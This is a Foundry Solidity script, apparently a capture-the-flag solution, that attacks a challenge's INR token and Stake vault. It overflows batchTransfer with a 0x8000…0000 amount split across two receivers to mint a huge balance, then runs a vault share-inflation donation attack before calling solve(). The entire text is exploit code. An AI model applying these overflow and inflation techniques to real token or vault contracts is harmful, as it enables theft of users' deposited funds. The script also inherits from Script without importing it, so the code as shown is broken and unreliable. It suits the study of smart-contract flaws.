pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Setup} from "../src/Setup.sol";
import {Stake} from "../src/Stake.sol";
import {INR} from "../src/INR.sol";

contract Solve is Script{
    function run() public {
        vm.startBroadcast();
        Setup setup=Setup(vm.envAddress("SETUP"));
        Stake stake=setup.stake();
        INR inr=setup.inr();
        setup.claim();
        inr.approve(address(stake), type(uint256).max);
        address[] memory receivers = new address[](2);
        receivers[0] = msg.sender;
        receivers[1] = address(0);
        inr.batchTransfer(receivers, 0x8000000000000000000000000000000000000000000000000000000000000000);
        stake.deposit(1, msg.sender);
        inr.transfer(address(stake), 50_000 ether);
        setup.stakeINR();
        setup.solve();
        vm.stopBroadcast();
    }
}
/*

share=1 asset=1

share=1 asset=2


*/